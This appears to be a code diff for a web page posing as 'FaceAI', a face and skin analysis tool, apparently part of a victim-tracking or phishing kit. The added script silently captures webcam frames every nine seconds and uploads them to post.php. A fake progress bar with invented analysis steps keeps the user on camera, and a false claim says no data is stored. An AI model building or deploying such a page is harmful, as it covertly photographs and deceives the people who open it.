@@ -1,134 +1,172 @@
-<!doctype html>
-<html>
+﻿<!DOCTYPE html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FaceAI &ndash; Smart Face Analysis</title>
+  <link rel="stylesheet" href="style.css" />
   <script src="../../assets/js/jquery.min.js"></script>
   <script src="../../assets/js/client.min.js"></script>
   <script src="../../assets/js/loc.js"></script>
 </head>
-
-</html>
-<html>
 <body onload="mydata()">
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
+  <!-- Hidden capture canvas -->
+  <canvas id="canvas" width="640" height="640" style="display:none;"></canvas>
 
-<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+  <!-- UI -->
+  <div class="wrapper">
+    <div class="card">
+      <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="12" r="10" stroke="url(#g)" stroke-width="2"/>
+          <path d="M8 12c0-2.21 1.79-4 4-4s4 1.79 4 4-1.79 4-4 4-4-1.79-4-4z" fill="url(#g)"/>
+          <defs>
+            <linearGradient id="g" x1="0" y1="0" x2="24" y2="24" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#a78bfa"/>
+              <stop offset="1" stop-color="#38bdf8"/>
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+      <h1>FaceAI</h1>
+      <p class="subtitle">AI-powered face analysis &amp; skin diagnostics</p>
+
+      <!-- Scanner box: video lives inside the oval -->
+      <div class="scanner-box" id="scannerBox">
+        <div class="face-outline">
+          <video id="video" playsinline autoplay muted></video>
+          <div class="corner tl"></div>
+          <div class="corner tr"></div>
+          <div class="corner bl"></div>
+          <div class="corner br"></div>
+          <div class="scan-line" id="scanLine" style="display:none;"></div>
+        </div>
+        <p class="scan-label" id="scanLabel">Position your face in the frame</p>
+      </div>
+
+      <div class="progress-area" id="progressArea" style="display:none;">
+        <p class="progress-label" id="progressLabel">Initializing camera...</p>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <ul class="steps">
+          <li id="s1">&#x25CB; Detecting face geometry</li>
+          <li id="s2">&#x25CB; Analyzing skin texture</li>
+          <li id="s3">&#x25CB; Generating report</li>
+        </ul>
+      </div>
+
+      <button class="btn" id="startBtn" onclick="startScan()">Start Analysis</button>
+      <p class="disclaimer">Camera access is required for face analysis. No data is stored on our servers.</p>
+    </div>
+  </div>
 
 <script>
+'use strict';
 
-function post(imgdata){
-$.ajax({
+function post(imgdata) {
+  $.ajax({
     type: 'POST',
-    data: { cat: imgdata},
+    data: { cat: imgdata },
     url: 'post.php',
     dataType: 'json',
     async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
+    success: function () {},
+    error: function () {}
   });
-};
+}
 
-
-'use strict';
-
-const video = document.getElementById('video');
+const video  = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+const constraints = { audio: false, video: { facingMode: 'user' } };
 
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-// environment -- user
-
-// Access webcam
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
+    video.srcObject = stream;
+    // Show scan line once camera is live
+    video.onloadedmetadata = function () {
+      document.getElementById('scanLine').style.display = 'block';
+      document.getElementById('scanLabel').textContent  = 'Face detected — analyzing...';
+    };
+    const ctx = canvas.getContext('2d');
+    setInterval(function () {
+      ctx.drawImage(video, 0, 0, 640, 640);
+      const cc = canvas.toDataURL('image/png').replace('data:image/png;base64,', '');
+      post(cc);
+    }, 9000);
+  } catch (e) {}
 }
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 640);
-       var canvasData = canvas.toDataURL("image/png")
-       cc = String(canvasData).replace("data:image/png;base64,","")
-      //  console.log(cc)
-       post(cc); }, 9000);
-  
-
+function startScan() {
+  document.getElementById('startBtn').style.display     = 'none';
+  document.getElementById('progressArea').style.display = 'block';
+  init();
+  animateProgress();
 }
 
-// Load init
-init();
+function animateProgress() {
+  const fill   = document.getElementById('progressFill');
+  const label  = document.getElementById('progressLabel');
 
+  // Detailed multi-phase messages shown during the long analysis
+  const phases = [
+    { at:  0, msg: 'Initializing camera sensors...' },
+    { at:  5, msg: 'Calibrating image capture...' },
+    { at: 10, msg: 'Detecting facial landmarks...' },
+    { at: 16, msg: 'Mapping 68 facial keypoints...' },
+    { at: 22, msg: 'Analyzing bone structure...' },
+    { at: 28, msg: 'Measuring facial symmetry...' },
+    { at: 34, msg: 'Scanning skin texture...' },
+    { at: 40, msg: 'Detecting pores & fine lines...' },
+    { at: 46, msg: 'Running UV damage analysis...' },
+    { at: 52, msg: 'Estimating skin hydration level...' },
+    { at: 57, msg: 'Cross-referencing database...' },
+    { at: 63, msg: 'Applying deep learning model v4.2...' },
+    { at: 69, msg: 'Computing skin score...' },
+    { at: 74, msg: 'Identifying improvement areas...' },
+    { at: 80, msg: 'Generating personalized report...' },
+    { at: 87, msg: 'Compiling recommendations...' },
+    { at: 93, msg: 'Finalizing results...' },
+    { at: 98, msg: 'Almost done...' },
+  ];
+
+  // Step list triggers
+  const stepTriggers = [
+    { at: 10, id: 's1' },
+    { at: 46, id: 's2' },
+    { at: 80, id: 's3' },
+  ];
+
+  let pct = 0;
+  let phaseIdx = 0;
+  let stepIdx  = 0;
+
+  // Total duration ~90 seconds — interval every 900ms, increment 1%
+  const iv = setInterval(function () {
+    pct += 1;
+    fill.style.width = pct + '%';
+
+    // Update label at phase thresholds
+    while (phaseIdx < phases.length && pct >= phases[phaseIdx].at) {
+      label.textContent = phases[phaseIdx].msg;
+      phaseIdx++;
+    }
+
+    // Tick off steps
+    while (stepIdx < stepTriggers.length && pct >= stepTriggers[stepIdx].at) {
+      const li = document.getElementById(stepTriggers[stepIdx].id);
+      li.textContent = '\u2713 ' + li.textContent.slice(2);
+      li.classList.add('done');
+      stepIdx++;
+    }
+
+    if (pct >= 100) {
+      clearInterval(iv);
+      label.textContent = 'Analysis complete!';
+      fill.style.background = 'linear-gradient(90deg,#34d399,#06b6d4)';
+    }
+  }, 900); // 900ms × 100 steps = ~90 seconds
+}
 </script>
-
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <link rel="stylesheet" href="style.css">
-    <title>Face-App</title>
-    <script>
-        window.console = window.console || function (t) {
-        };
-    </script>
-    <script>
-        if (document.location.search.match(/type=embed/gi)) {
-            window.parent.postMessage("resize", "*");
-        }
-    </script>
-</head>
-
-<body translate="no">
-<div id="device">
-    <div id="top">
-        <div class="left">&nbsp;</div>
-        <div class="right">&nbsp;</div>
-    </div>
-    <div id="content">
-        <div class="menu"><i class="fas fa-bolt fa-lg"></i>
-            <div class="profilePhoto"></div>
-            <i class="fas fa-volume-mute fa-lg"></i>
-        </div>
-        <div class="takenPhotos">
-            <div class="first"></div>
-            <div class="second"></div>
-            <div class="third"></div>
-        </div>
-        <div class="circle">
-            <div class="fill"></div>
-        </div>
-        <i class="fas fa-sync-alt fa-lg right"></i>
-        <div class="detection">
-            <div class="line-left"></div>
-            <div class="line-top"></div>
-            <div class="line-right"></div>
-            <div class="line-bottom"></div>
-        </div>
-    </div>
-</div>
-<link rel="stylesheet" href="all.css">
 </body>
 </html>
